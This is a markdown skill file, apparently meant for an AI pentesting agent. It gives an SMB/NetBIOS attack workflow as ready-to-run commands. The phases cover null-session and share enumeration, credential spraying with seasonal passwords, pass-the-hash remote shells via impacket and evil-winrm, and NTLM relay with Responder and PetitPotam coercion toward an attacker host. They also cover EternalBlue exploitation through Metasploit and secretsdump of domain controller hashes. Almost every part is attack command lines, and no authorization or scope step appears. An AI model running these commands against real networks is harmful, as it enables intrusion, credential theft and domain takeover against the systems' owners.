---
name: proto-smb
description: "SMB/NetBIOS security testing skill. Null session enumeration, credential spraying, pass-the-hash, relay attacks, EternalBlue, and share enumeration. Triggers: 'smb', 'samba', 'netbios', 'smb testing', 'smb enumeration', 'smb relay', 'eternalblue', 'ntlm relay', 'smb signing', 'share enumeration'."
---

# SMB / NetBIOS Security Testing

Workflow: null session → authenticated enumeration → credential attack → exploit known vulns.

## Phase 1: Discovery & Fingerprinting

```bash
nmap -p 139,445 <target_range> -sV --open -oG smb_hosts.txt

crackmapexec smb <target_range> 2>/dev/null

nmap -p 139,445 <target> -sV -sC --script smb-os-discovery,smb-security-mode,smb2-security-mode
```

## Phase 2: Null Session Enumeration

```bash
smbclient -L //<target>/ -N
smbmap -H <target>  # No credentials — shows share perms

enum4linux-ng <target>
enum4linux -a <target>

rpcclient -U "" -N <target> << 'EOF'
enumdomusers
enumdomgroups
querydominfo
queryuserinfo
EOF

ldapsearch -x -h <target> -b "DC=domain,DC=local" 2>/dev/null | head -50
```

## Phase 3: Authenticated Enumeration

```bash
crackmapexec smb <target> -u <user> -p <password> --shares
smbmap -H <target> -u <user> -p <password>

smbclient //<target>/<share_name> -U <user>%<password>
smbmap -H <target> -u <user> -p <password> -r <share_name>
smbmap -H <target> -u <user> -p <password> --download '<share>\<file>'

sudo mount -t cifs //<target>/<share> /mnt/smb -o user=<user>,password=<password>
find /mnt/smb -name "*.txt" -o -name "*.ini" -o -name "*.cfg" 2>/dev/null
sudo umount /mnt/smb

crackmapexec smb <target> -u <user> -p <password> -M spider_plus --spider <share>
```

## Phase 4: Pass-the-Hash

No cracking required if NTLM hash available:

```bash
crackmapexec smb <target_range> -u <user> -H <ntlm_hash>
crackmapexec smb <target_range> -u Administrator -H <hash> --local-auth

crackmapexec winrm <target> -u <user> -H <ntlm_hash>

evil-winrm -i <target> -u <user> -H <ntlm_hash>
impacket-psexec <domain>/<user>@<target> -hashes :<ntlm_hash>
impacket-wmiexec <domain>/<user>@<target> -hashes :<ntlm_hash>
```

## Phase 5: Credential Spraying

```bash
crackmapexec smb <target> -u users.txt -p <password> --no-bruteforce --continue-on-success

crackmapexec smb <target_range> -u Administrator -p 'Password123!' --local-auth
crackmapexec smb <target_range> -u Administrator -p '' --local-auth  # Empty password

for pass in 'Spring2024!' 'Summer2024!' 'Winter2024!' 'Fall2024!'; do
  crackmapexec smb <target> -u users.txt -p "$pass" --no-bruteforce 2>/dev/null | grep "+"
done
```

## Phase 6: NTLM Relay Attack

Requires: SMB signing disabled on target (check in Phase 1).

```bash
# 1. Identify hosts with signing disabled
crackmapexec smb <target_range> --gen-relay-list relay_targets.txt

# 2. Set up Responder (poisoning) + ntlmrelayx (relay)

responder -I <interface> -dfw &

ntlmrelayx.py -tf relay_targets.txt -smb2support -i  # Interactive shell

ntlmrelayx.py -tf relay_targets.txt -smb2support

# 3. Trigger coerce authentication (Petitpotam, PrinterBug)
python3 PetitPotam.py <attacker_ip> <dc_ip>  # Anonymous coerce
python3 printerbug.py <domain>/<user>:<pass>@<target_ip> <attacker_ip>  # Spoolss
```

## Phase 7: Vulnerability Scanning

```bash
nmap --script smb-vuln-ms17-010 -p 445 <target>

python3 exploit/ms17-010/eternalblue_exploit7.py <target_ip>

msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target>; run"

nmap --script smb-vuln-ms17-010 -p 445 <target>

nmap --script smb-vuln-ms17-010 -p 445 <target>  # May detect
python3 scanner.py <target>  # SMBGhost scanner

nmap --script "smb-vuln-*" -p 139,445 <target>
```

## Phase 8: Secretsdump

```bash
impacket-secretsdump <domain>/<user>:<password>@<target_ip>
impacket-secretsdump <domain>/<user>@<target_ip> -hashes :<ntlm_hash>

impacket-secretsdump -sam SAM -system SYSTEM LOCAL

impacket-secretsdump <domain>/<admin>:<password>@<dc_ip> -just-dc -outputfile dc_hashes
```

## Validation (REQUIRED before reporting)

Document:
1. Target IP, OS, signing status
2. Shares accessible (name, permissions, sensitive files found)
3. Credentials obtained (method: null session/spray/PTH/relay/dump)
4. Any CVEs exploited with evidence (whoami output on target)
